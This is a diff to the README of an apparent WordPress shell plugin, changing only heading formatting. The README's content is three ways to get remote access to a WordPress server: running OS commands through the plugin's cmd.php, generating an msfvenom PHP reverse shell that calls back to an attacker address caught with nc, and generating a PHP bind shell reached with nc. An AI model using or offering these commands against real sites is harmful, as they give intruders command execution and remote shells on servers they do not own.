@@ -1,13 +1,13 @@
 # wordpress-reverse-bind-shell
 
-###1st option
+## 1st option
 http://server.fun/wordpress/wp-content/plugins/wordpress-reverse-bind-shell/cmd.php?cmd=whoami
 
-###2nd option
+## 2nd option
 msfvenom -p php/reverse_php -f raw  LHOST=10.11.0.36 LPORT=4444 -o reverse.php
 nc -lvnp 4444
 
-###3rd option
+## 3rd option
 msfvenom -p php/bind_php -f raw LPORT=4444 -o bind.php
 nc server.fun 4444
 
